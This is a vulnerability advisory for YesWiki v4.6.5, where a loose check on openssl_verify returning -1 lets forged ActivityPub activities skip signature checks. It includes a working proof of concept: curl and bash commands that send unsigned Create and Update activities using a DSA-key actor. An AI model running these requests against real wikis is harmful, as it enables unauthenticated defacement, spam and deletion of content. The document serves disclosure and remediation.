## Details
## Summary
`HttpSignatureService::verifySignature()` checks the result of PHP's `openssl_verify()` with a **loose boolean negation** - `if (!openssl_verify(...)) { throw ... }`. PHP's `openssl_verify` has four possible return values:

| return | meaning                                          | `!return` |
| ------ | ------------------------------------------------ | --------- |
| `1`    | signature is valid                               | `false`   |
| `0`    | signature is invalid                             | `true` ✓  |
| `-1`   | the verify call itself failed (internal error)   | **`false` ❌** |
| `false`| input rejected by PHP's argument validation      | `true` ✓  |

The `-1` row is the bypass: PHP's truthiness rules make `-1` a truthy value, so `!(-1) === false`, the throw is skipped, and the controller proceeds to `processActivity()`. Any condition that makes OpenSSL's `EVP_VerifyFinal()` return `-1` triggers the bypass.

The two practical paths to `-1` we are aware of:

1. **DSA / EC public key with an RSA-only algorithm.** `openssl_verify(..., $dsaKey, "RSA-SHA256")` returns `int(-1)` on PHP 8.3 + OpenSSL 3.x. This is the path the PoC uses; it works against an unmodified `php:8.3-apache` lab and against any deployment using the runtime stack YesWiki's own docker image ships.
2. **Older PHP + older OpenSSL** where any unrecognised digest name returned `-1` rather than `false`. The reporting research mentions this path; on current stacks `false` is returned instead and the throw fires correctly. The DSA path replaces it.

The reachable consequence is the same in both cases - the controller silently treats a failed verification as success and processes the attacker's payload.

## Details
### Affected component

* **File:** `tools/bazar/services/HttpSignatureService.php`
* **Method:** `HttpSignatureService::verifySignature(Request $request)`
* **Sink:** line **130**

```php
// tools/bazar/services/HttpSignatureService.php  (v4.6.5 = origin/doryphore-dev HEAD)
public function verifySignature(Request $request) {
    ...                                                          // [Signature parse,
                                                                 //  outbound key fetch — see the SSRF advisory]
    $actorPublicKey = openssl_get_publickey($actor['publicKey']['publicKeyPem']);
    ...
    if (!openssl_verify(                                         // (a) LOOSE BOOLEAN CHECK
            join("\n", $sigParts),
            base64_decode($sigConf['signature']),
            $actorPublicKey,
            strtoupper($sigConf['algorithm'])
    )) {
        throw new Exception('Signature verification failed');    // (b) skipped when openssl_verify == -1
    }

    if ($request->headers->get('Digest') !== $this->getDigest($request->getContent())) {
        throw new Exception('Digest mismatch');                  // (c) still enforced — easy to satisfy
    }
}
```

The inbox controller calls `verifySignature()` and then runs `processActivity($activity, $form)`, which is what actually mutates state.

### End-to-end attack chain

A single unauthenticated POST per operation. No session, no CSRF, no real signature.

1. **Stand up an actor document** that the attacker controls — any public web server (or webhook receiver) that returns a JSON body with the shape:

    ```json
    {
      "id": "<exact URL the server will GET>",
      "publicKey": {
        "id": "<same URL>",
        "publicKeyPem": "<DSA public key in PEM form>"
      }
    }
    ```

2. **Send a Create / Update / Delete activity** to `POST /api/forms/{enabled-form-id}/actor/inbox`:

    ```http
    POST /?api/forms/2/actor/inbox HTTP/1.1
    Host: target.example
    Content-Type: application/activity+json
    Date: <RFC1123 date>
    Digest: SHA-256=<base64(sha256(body))>
    Signature: keyId="<actor URL>",algorithm="RSA-SHA256",headers="(request-target) host date digest content-type",signature="anVuaw=="

    {"@context":"https://www.w3.org/ns/activitystreams","type":"Create",
     "actor":"<actor URL>",
     "object":{"id":"<unique object URI>","type":"Event","name":"...","startTime":"..."}}
    ```

3. **YesWiki fetches the actor document** (line 96 - the SSRF; see sibling advisory), parses it, calls `openssl_get_publickey(...)` which returns a valid OpenSSL key handle (DSA is parsed successfully), then calls `openssl_verify($data, "junk-sig", $dsaKey, "RSA-SHA256")`. EVP_VerifyFinal returns `-1`. The check `!openssl_verify(...)` evaluates to `false` and the throw is skipped.
4. **`Digest` header is enforced**, but it's a simple `SHA-256=` of the body the attacker chose, so satisfying it costs one `sha256sum`.
5. **`processActivity($activity, $form)` runs**: Create → `EntryManager::create()`, Update → `EntryManager::update()`, Delete → `EntryManager::delete()`. The triple store records the attacker's `object.id` as the source URL, which is how Update / Delete locate the entry on subsequent calls.

## PoC
### Pre Reqs

* Yeswiki v4.6.5 lab image (Setup via podman)
* ActivityPub enabled on the target form

For the rest of this document:

```bash
BASE="http://localhost:8085"
CTR="yeswiki-poc"
KEYID="http://127.0.0.1:9999/actors/attacker"
FORM_ID=2
MARKER="DEMO_$(date +%s)"
```

PHP one-liner - runs against the exact PHP+OpenSSL the lab is using. Confirm that `openssl_verify` returns `-1`.

```bash
podman exec "$CTR" php -r '
    $pem = file_get_contents("/tmp/attacker_keys/dsa.pub");
    $key = openssl_get_publickey($pem);
    $r   = openssl_verify("hello", "junk", $key, "RSA-SHA256");
    echo "openssl_verify returned: " . var_export($r, true) . "\n";
    echo "!openssl_verify(...)  is: " . var_export(!$r, true) . "\n";
'
```

**Expected output:**

```
openssl_verify returned: -1
!openssl_verify(...)  is: false
```

Verify the listener is up and serving the DSA-key actor

```bash
podman exec "$CTR" cat /tmp/ssrf_listener.pid
podman exec "$CTR" ps -p $(podman exec "$CTR" cat /tmp/ssrf_listener.pid) -o stat=
podman exec "$CTR" curl -s http://127.0.0.1:9999/actors/attacker | head -c 300; echo
```

**Expected output:** a PID, `S` (sleeping/alive), and a JSON document beginning with `{"@context":"https://www.w3.org/ns/activitystreams","id":"http://127.0.0.1:9999/actors/attacker", ...` and a `publicKeyPem` field whose value starts with `-----BEGIN PUBLIC KEY-----\nMIIB...` (the DSA key - note the `Bv` prefix typical of DSA-key DER, not the `Ij` of RSA).

Build a JSON Create activity that the Agenda form's reverse-semantic template can map (it expects an `Event` with `name`, `content`, `startTime`, `endTime`, `location.address.*`, etc.):

```bash
ACTIVITY='{
  "@context": "https://www.w3.org/ns/activitystreams",
  "type": "Create",
  "id":   "http://127.0.0.1:9999/activity/c-'"$MARKER"'",
  "actor":"'"$KEYID"'",
  "object": {
    "id":   "http://127.0.0.1:9999/objects/'"$MARKER"'",
    "type": "Event",
    "name": "'"$MARKER"' — created via the signature-verification bypass",
    "content": "openssl_verify returned -1; YesWiki accepted us anyway",
    "startTime": "2026-12-01T10:00:00Z",
    "endTime":   "2026-12-01T12:00:00Z"
  }
}'

# Digest must equal SHA-256= base64(sha256(body)) - this header IS enforced
DIGEST="SHA-256=$(printf '%s' "$ACTIVITY" | openssl dgst -sha256 -binary | base64)"
DATE="$(date -uR | sed 's/+0000/GMT/')"
SIG='keyId="'"$KEYID"'",algorithm="RSA-SHA256",headers="(request-target) host date digest content-type",signature="anVuaw=="'

curl -s -X POST "${BASE}/?api/forms/${FORM_ID}/actor/inbox" \
     -H "Content-Type: application/activity+json" \
     -H "Date: ${DATE}" \
     -H "Digest: ${DIGEST}" \
     -H "Signature: ${SIG}" \
     --data-raw "$ACTIVITY" \
     -w '\n  HTTP %{http_code}\n'
```

Now, try udating the entry via the same bypass

The triple store records `<tag, sourceUrl, object.id>` from the Create. An Update activity referencing the same `object.id` will look that up and rewrite the entry's body.

```bash
UPDATE_ACT='{
  "@context": "https://www.w3.org/ns/activitystreams",
  "type": "Update",
  "id":   "http://127.0.0.1:9999/activity/u-'"$MARKER"'",
  "actor":"'"$KEYID"'",
  "object": {
    "id":   "http://127.0.0.1:9999/objects/'"$MARKER"'",
    "type": "Event",
    "name": "'"$MARKER"'_UPDATED — title was changed by an unauthenticated POST",
    "content": "this row was modified via the SAME bypass",
    "startTime": "2026-12-01T10:00:00Z",
    "endTime":   "2026-12-01T12:00:00Z"
  }
}'
DIGEST="SHA-256=$(printf '%s' "$UPDATE_ACT" | openssl dgst -sha256 -binary | base64)"
DATE="$(date -uR | sed 's/+0000/GMT/')"

curl -s -X POST "${BASE}/?api/forms/${FORM_ID}/actor/inbox" \
     -H "Content-Type: application/activity+json" \
     -H "Date: ${DATE}" \
     -H "Digest: ${DIGEST}" \
     -H "Signature: ${SIG}" \
     --data-raw "$UPDATE_ACT" \
     -w '  HTTP %{http_code}\n'
```

**Expected output:** `HTTP 200`, empty body.

## Impact
CRUD on bazar entries of any ActivityPub-enabled form, **without authentication**:

* **Create** - `EntryManager::create($form['bn_id_nature'], $entry, false, $object['id'])`. New row in `yeswiki_pages` and a triple `<tag, sourceUrl, $object['id']>` in `yeswiki_triples`.
* **Update** - looks up the entry via the source-URL triple and rewrites its body with the attacker-supplied content.
* **Delete** - same lookup, then `EntryManager::delete($tag, true)`.

Concrete operational impact:

* **Defacement / content injection** at scale - a public-facing wiki with the Agenda or Blog-actu form federated becomes a publishing target for any attacker who can route TCP to the YesWiki host.
* **Spam / SEO poisoning** through the Bazar entry body, which is HTML-rendered for the wiki and indexed by search.
* **Erasure of legitimate federated content** - any entry previously created via ActivityPub can be enumerated through the public outbox endpoint, its `object.id` discovered, and then deleted by replaying the chain with `type=Delete`.
* **Triple-store pollution** - the `yeswiki_triples` table grows with attacker-controlled `sourceUrl` triples that survive entry deletion and can interfere with later federation flows.
* **Reputation / federation poisoning** - the wiki appears (to remote ActivityPub peers and to its own users) to be receiving signed content from a remote actor, when in reality anyone on the network can post.
